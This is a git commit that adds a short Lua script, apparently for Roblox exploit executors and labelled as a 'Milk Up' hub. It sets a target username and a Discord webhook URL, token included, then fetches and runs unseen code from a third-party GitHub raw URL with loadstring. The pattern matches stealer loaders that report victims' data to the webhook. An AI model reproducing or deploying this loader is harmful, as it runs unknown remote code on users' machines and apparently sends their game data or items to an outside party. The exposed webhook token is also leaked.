dd26be4800477df0d3348da073bc15376378689b
trumskid <132593313+trumskid@users.noreply.github.com>
2023-05-10 05:30:48 +0700

    Add files via upload

---
+++ milkup.lua
@@ -0,0 +1,5 @@
+_G.Username = "farmert_7"
+_G.HubName = "Milk Up"
+_G.WebhookUrl = "https://discordapp.com/api/webhooks/1105620685272916019/-JogLuTZiTyr3gu8XX-zgJIku1wxWqYLd04jzjqDoz5iji-uJlAQ-W8M2ohQmUHZJCTj"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
